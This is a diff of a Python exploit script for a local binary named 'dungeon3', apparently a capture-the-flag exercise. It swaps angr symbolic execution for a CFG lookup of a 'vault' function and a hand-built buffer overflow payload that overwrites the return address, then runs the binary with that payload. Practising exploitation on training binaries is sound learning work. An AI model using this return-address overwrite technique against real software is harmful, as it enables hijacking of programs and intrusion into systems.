@@ -1,33 +1,38 @@
 import angr
-import claripy
 import subprocess
+
+def find_vault_address(binary_path):
+    proj = angr.Project(binary_path, auto_load_libs=False)
+    cfg = proj.analyses.CFG()
+
+    vault_addr = None
+    for func in cfg.kb.functions.values():
+        if func.name == "vault":
+            vault_addr = func.addr
+            break
+
+    return vault_addr
+
 def exploit_dungeon3(buffer_size, vault_addr):
     binary_path = './dungeon3'
     proj = angr.Project(binary_path, auto_load_libs=False)
-    # Create a symbolic bitvector for the input
-    buffer_overflow_bvv = claripy.BVS("input", buffer_size * 8)
-    # Create a state at the entry point of the binary
-    entry_state = proj.factory.entry_state(args=[binary_path], stdin=buffer_overflow_bvv)
-    # Create a simulation manager with the entry state
-    sm = proj.factory.simulation_manager(entry_state)
-    # Explore the binary to try to reach the address of the vault function
-    sm.explore(find=vault_addr)
-    if sm.found:
-        # If we found a path to the vault function, take the first one
-        solution_state = sm.found[0]
-        # Get the concrete input that leads to the vault function
-        solution = solution_state.solver.eval(buffer_overflow_bvv, cast_to=bytes)
-        # Write the solution to a payload file
-        with open('payload.txt', 'wb') as f:
-            f.write(solution)
-        print("Generated payload.")
-    else:
-        print("No solution found.")
-def execute_payload():
-    with open("payload.txt", "rb") as f:
-        subprocess.run(["./dungeon3"], input=f.read(), check=True)
+
+    buffer_overflow_input = b'A' * buffer_size + vault_addr.to_bytes(8, 'little')
+
+    with open('payload.txt', 'wb') as f:
+        f.write(buffer_overflow_input)
+
+    print("Generated payload.")
+
+    # Execute dungeon3 with the payload as input
+    subprocess.run(["./dungeon3"], stdin=open("payload.txt", "rb"), check=True)
+
 if __name__ == "__main__":
-    buffer_size = 40  # From manual analysis
-    vault_addr = 0x0000000000400607  # From manual analysis
-    exploit_dungeon3(buffer_size, vault_addr)
-    execute_payload()
+    binary_path = './dungeon3'
+    vault_addr = find_vault_address(binary_path)
+    if vault_addr:
+        print(f"Vault address: 0x{vault_addr:016x}")
+        buffer_size = 40
+        exploit_dungeon3(buffer_size, vault_addr)
+    else:
+        print("Vault address not found.")
